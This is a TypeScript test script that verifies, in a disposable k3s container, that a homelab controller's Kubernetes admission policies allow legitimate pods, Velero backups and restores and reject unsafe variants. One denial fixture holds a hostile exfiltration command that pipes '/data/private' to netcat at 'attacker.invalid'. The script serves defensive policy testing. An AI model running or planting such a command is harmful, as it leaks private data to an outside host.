/** Local extended proof only: all Kubernetes calls execute inside an agentless disposable k3s container. */
import { App, Chart } from "cdk8s";
import { createHash } from "node:crypto";
import { parseAllDocuments } from "yaml";
import { z } from "zod";
import { createDeliveryMinecraftController } from "@shepherdjerred/homelab/cdk8s/src/resources/delivery/minecraft-controller.ts";
import versions from "@shepherdjerred/homelab/cdk8s/src/versions.ts";
import { admissionProcessResult } from "./local-process.ts";
import {
  clearInertCopyFixtures,
  proveAdditionalOperations,
  type AdmissionCase,
} from "./operations.ts";

const ACTOR =
  "system:serviceaccount:delivery-tsmc-controller:delivery-tsmc-controller";
import {
  AdmissionManifestSchema as Manifest,
  loadAdmissionFixtures,
} from "./fixtures.ts";
const container = z
  .string()
  .regex(/^delivery-admission-proof-[a-z0-9-]+$/u)
  .parse(Bun.argv[2]);

async function checked(command: string[], input?: unknown) {
  const executable = command[0];
  if (executable === undefined) throw new Error("Proof command is empty");
  const result = await admissionProcessResult(command, input);
  if (result.code !== 0)
    throw new Error(`${executable} failed: ${result.stderr.slice(0, 3000)}`);
  return result.stdout;
}
function kubectl(parameters: string[], input?: unknown) {
  return admissionProcessResult(
    ["docker", "exec", "-i", container, "kubectl", ...parameters],
    input,
  );
}
async function apply(items: unknown[]) {
  const result = await kubectl(
    ["apply", "--server-side", "--force-conflicts", "-f", "-"],
    {
      apiVersion: "v1",
      kind: "List",
      items,
    },
  );
  if (result.code !== 0)
    throw new Error(
      `Isolated API apply failed: ${result.stderr.slice(0, 3000)}`,
    );
}
function change(
  input: unknown,
  path: (string | number)[],
  value: unknown,
): unknown {
  const result: unknown = structuredClone(input);
  if (typeof result !== "object" || result === null)
    throw new Error("Expected JSON fixture object");
  let cursor: object = result;
  for (const key of path.slice(0, -1)) {
    const child: unknown = Reflect.get(cursor, key);
    if (typeof child !== "object" || child === null)
      throw new Error("Fixture path is absent");
    cursor = child;
  }
  const last = path.at(-1);
  if (last === undefined) throw new Error("Fixture path is empty");
  Reflect.set(cursor, last, value);
  return result;
}

const inspection = z
  .array(
    z.object({
      Config: z.object({ Image: z.string(), Cmd: z.array(z.string()) }),
    }),
  )
  .parse(JSON.parse(await checked(["docker", "inspect", container])))[0];
if (
  inspection === undefined ||
  !inspection.Config.Image.startsWith("rancher/k3s:") ||
  !inspection.Config.Cmd.includes("--disable-agent")
)
  throw new Error(
    "Proof requires a disposable k3s container with no workload agent",
  );
await checked(["docker", "exec", container, "kubectl", "get", "--raw=/readyz"]);
const nodes = z
  .object({ items: z.array(z.unknown()) })
  .parse(
    JSON.parse(
      await checked([
        "docker",
        "exec",
        container,
        "kubectl",
        "get",
        "nodes",
        "-o",
        "json",
      ]),
    ),
  );
if (nodes.items.length > 0)
  throw new Error("Admission proof must not have any workload nodes");

// The actual controller synthesis supplies policies and exact least-privilege grants.
// Its StatefulSet, Secrets, PVC, and registry declarations are never applied here.
const chart = new Chart(new App(), "admission-proof");
createDeliveryMinecraftController(chart, {
  executorItemId: "test-executor",
  registryItemId: "test-registry",
});
const rendered = z.array(Manifest).parse(chart.toJson());
const baseKinds = new Set([
  "Namespace",
  "ServiceAccount",
  "Role",
  "RoleBinding",
  "ClusterRole",
  "ClusterRoleBinding",
]);
await apply([
  ...["minecraft-tsmc", "argocd", "velero"].map((name) => ({
    apiVersion: "v1",
    kind: "Namespace",
    metadata: { name },
  })),
  ...rendered.filter((item) => baseKinds.has(item.kind)),
  {
    apiVersion: "v1",
    kind: "ServiceAccount",
    metadata: {
      name: "delivery-tsmc-controller",
      namespace: "minecraft-tsmc-delivery-validation",
    },
    automountServiceAccountToken: false,
  },
]);

// Use the real CRDs from the same pinned upstream chart as the homelab.
const crdYaml = await checked([
  "helm",
  "show",
  "crds",
  "velero",
  "--repo",
  "https://vmware-tanzu.github.io/helm-charts",
  "--version",
  versions.velero,
]);
const crds = parseAllDocuments(crdYaml)
  .map((document) => Manifest.parse(document.toJSON()))
  .filter((item) =>
    ["backups.velero.io", "restores.velero.io"].includes(item.metadata.name),
  );
if (crds.length !== 2)
  throw new Error("Pinned Velero chart must provide Backup and Restore CRDs");
await apply(crds);
await checked([
  "docker",
  "exec",
  container,
  "kubectl",
  "wait",
  "--for=condition=Established",
  "crd/backups.velero.io",
  "crd/restores.velero.io",
  "--timeout=30s",
]);
const guards = rendered.filter((item) =>
  ["ValidatingAdmissionPolicy", "ValidatingAdmissionPolicyBinding"].includes(
    item.kind,
  ),
);
await apply(guards);
const policyStatus = await checked([
  "docker",
  "exec",
  container,
  "kubectl",
  "get",
  "validatingadmissionpolicies",
  "-o",
  "json",
]);
const policies = z
  .object({
    items: z.array(
      z.looseObject({
        status: z
          .looseObject({
            typeChecking: z
              .object({ expressionWarnings: z.array(z.unknown()).optional() })
              .optional(),
          })
          .optional(),
      }),
    ),
  })
  .parse(JSON.parse(policyStatus));
if (
  policies.items.some(
    (item) => (item.status?.typeChecking?.expressionWarnings?.length ?? 0) > 0,
  )
)
  throw new Error("Real API reported policy expression type-checking warnings");

const fixtures = await loadAdmissionFixtures(checked);
await clearInertCopyFixtures(kubectl, fixtures);

const results: AdmissionCase[] = [];
async function expectCreate(name: string, fixture: unknown, allowed: boolean) {
  const result = await kubectl(
    [`--as=${ACTOR}`, "create", "--dry-run=server", "-f", "-", "-o", "name"],
    fixture,
  );
  if (
    (result.code === 0) !== allowed ||
    (!allowed &&
      !result.stderr.includes(".sjer.red") &&
      !result.stderr.includes("violates PodSecurity"))
  )
    throw new Error(
      `${name}: expected ${allowed ? "allow" : "controller-policy denial"}; ${result.stderr.slice(0, 2400)}`,
    );
  results.push({
    name,
    allowed,
    layer: result.stderr.includes("violates PodSecurity")
      ? "pod-security"
      : "controller-admission",
  });
  console.log(`${allowed ? "ALLOW" : "DENY"} ${name}`);
}
for (const name of [
  "candidate",
  "sourceReader",
  "copyReader",
  "backup",
  "restore",
] as const)
  await expectCreate(name, fixtures[name], true);
await expectCreate("production-volume writer", fixtures.writer, false);
for (const [name, path, value] of [
  [
    "candidate on production claim",
    ["metadata", "namespace"],
    "minecraft-tsmc",
  ],
  [
    "candidate secret env",
    ["spec", "containers", 0, "envFrom"],
    [{ secretRef: { name: "production" } }],
  ],
  [
    "candidate service identity",
    ["spec", "serviceAccountName"],
    "delivery-tsmc-controller",
  ],
  [
    "candidate writable host mount",
    ["spec", "volumes", 0],
    { name: "data", hostPath: { path: "/" } },
  ],
  [
    "candidate altered overlay command",
    ["spec", "initContainers", 0, "command"],
    ["bash", "-c", "touch /data/unsafe"],
  ],
  [
    "candidate altered environment",
    ["spec", "containers", 0, "env", 1, "value"],
    "TRUE",
  ],
  [
    "reader writable source",
    ["spec", "containers", 0, "volumeMounts", 0, "readOnly"],
    false,
  ],
  [
    "candidate extra capability",
    ["spec", "containers", 0, "securityContext", "capabilities", "add"],
    ["NET_BIND_SERVICE"],
  ],
  [
    "candidate extra supplemental group",
    ["spec", "securityContext", "supplementalGroups"],
    [0],
  ],
  [
    "reader secret env",
    ["spec", "containers", 0, "envFrom"],
    [{ secretRef: { name: "production" } }],
  ],
  [
    "reader lifecycle exfiltration",
    ["spec", "containers", 0, "lifecycle"],
    {
      postStart: {
        exec: {
          command: ["sh", "-c", "cat /data/private | nc attacker.invalid 443"],
        },
      },
    },
  ],
  ["backup other namespace", ["spec", "includedNamespaces"], ["default"]],
  [
    "backup hooks",
    ["spec", "hooks"],
    {
      resources: [
        {
          name: "unsafe",
          includedNamespaces: ["minecraft-tsmc"],
          pre: [
            {
              exec: {
                container: "minecraft-tsmc",
                command: ["sh", "-c", "false"],
              },
            },
          ],
        },
      ],
    },
  ],
  [
    "restore into production",
    ["spec", "namespaceMapping"],
    { "minecraft-tsmc": "minecraft-tsmc" },
  ],
  ["restore other resource", ["spec", "includedResources"], ["secrets"]],
] satisfies [string, (string | number)[], unknown][]) {
  const base = name.startsWith("reader")
    ? fixtures.sourceReader
    : name.startsWith("backup")
      ? fixtures.backup
      : name.startsWith("restore")
        ? fixtures.restore
        : fixtures.candidate;
  await expectCreate(name, change(base, path, value), false);
}
// Persist only inert source fixtures. There is no workload agent and replicas
// remain zero; these checks exercise actual UPDATE admission, not its explicit
// dry-run allowance for the independent restoration guard probes.
await apply([
  {
    apiVersion: "apps/v1",
    kind: "StatefulSet",
    metadata: { name: "minecraft-tsmc", namespace: "minecraft-tsmc" },
    spec: {
      replicas: 0,
      serviceName: "minecraft-tsmc",
      selector: { matchLabels: { app: "minecraft-tsmc" } },
      template: {
        metadata: { labels: { app: "minecraft-tsmc" } },
        spec: {
          containers: [
            { name: "minecraft-tsmc", image: "registry.k8s.io/pause:3.10" },
          ],
        },
      },
    },
  },
  {
    apiVersion: "v1",
    kind: "Service",
    metadata: { name: "minecraft-tsmc", namespace: "minecraft-tsmc" },
    spec: {
      selector: { app: "minecraft-tsmc" },
      ports: [{ port: 25_565, targetPort: 25_565 }],
    },
  },
]);
async function expectPatch(
  name: string,
  kind: string,
  patch: unknown,
  allowed: boolean,
) {
  const result = await kubectl([
    `--as=${ACTOR}`,
    "-n",
    "minecraft-tsmc",
    "patch",
    kind,
    "minecraft-tsmc",
    "--type=merge",
    "-p",
    JSON.stringify(patch),
  ]);
  if (
    (result.code === 0) !== allowed ||
    (!allowed && !result.stderr.includes("delivery-tsmc-"))
  )
    throw new Error(
      `${name}: expected ${allowed ? "allow" : "controller-policy denial"}; ${result.stderr.slice(0, 2400)}`,
    );
  results.push({ name, allowed, layer: "controller-admission" });
  console.log(`${allowed ? "ALLOW" : "DENY"} ${name}`);
}
await expectPatch(
  "owned maintenance annotation",
  "statefulset",
  {
    metadata: {
      annotations: {
        "sjer.red/world-restore-lease": "6903b19f-f4d2-42a5-91ba-6ce046562c83",
        "sjer.red/world-restore-phase": "OFFLINE",
      },
    },
  },
  true,
);
await expectPatch(
  "server template replacement",
  "statefulset",
  {
    spec: {
      template: {
        spec: {
          containers: [
            { name: "minecraft-tsmc", image: "registry.k8s.io/pause:3.9" },
          ],
        },
      },
    },
  },
  false,
);
await expectPatch(
  "owned admission selector",
  "service",
  { spec: { selector: { "sjer.red/world-restore-access": "closed" } } },
  true,
);
await expectPatch(
  "service port replacement",
  "service",
  { spec: { ports: [{ port: 80, targetPort: 80 }] } },
  false,
);
await expectPatch(
  "unrelated source selector",
  "service",
  { spec: { selector: { app: "another-workload" } } },
  false,
);
results.push(...(await proveAdditionalOperations(kubectl, fixtures)));
const proof = {
  scope: "disposable-k3s-admission",
  container,
  kubernetesImage: inspection.Config.Image,
  veleroChartVersion: versions.velero,
  policiesSha256: createHash("sha256")
    .update(JSON.stringify(guards))
    .digest("hex"),
  cases: results,
  production: false,
  workloadsStarted: false,
};
await Bun.write(`/tmp/${container}.json`, JSON.stringify(proof, null, 2));
console.log(JSON.stringify(proof));
